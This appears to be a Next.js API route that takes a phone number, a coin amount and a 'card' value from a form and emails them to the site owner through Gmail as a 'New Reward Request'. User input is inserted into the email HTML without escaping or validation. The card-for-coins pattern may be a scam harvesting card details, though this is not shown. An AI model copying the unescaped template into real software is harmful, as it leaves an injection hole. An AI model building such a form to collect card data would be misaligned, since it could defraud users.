import nodemailer from "nodemailer";
import { NextResponse } from "next/server";

export async function POST(req: Request) {
  const { phone, coins, card } = await req.json();

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASS,
    },
  });

  await transporter.sendMail({
    from: process.env.EMAIL_USER,
    to: process.env.EMAIL_USER,
    subject: "New Reward Request",
    html: `
      <h2>Reward Request</h2>
      <p>Card: ${card}</p>
      <p>Coins: ${coins}</p>
      <p>Phone: ${phone}</p>
    `,
  });

  return NextResponse.json({ success: true });
}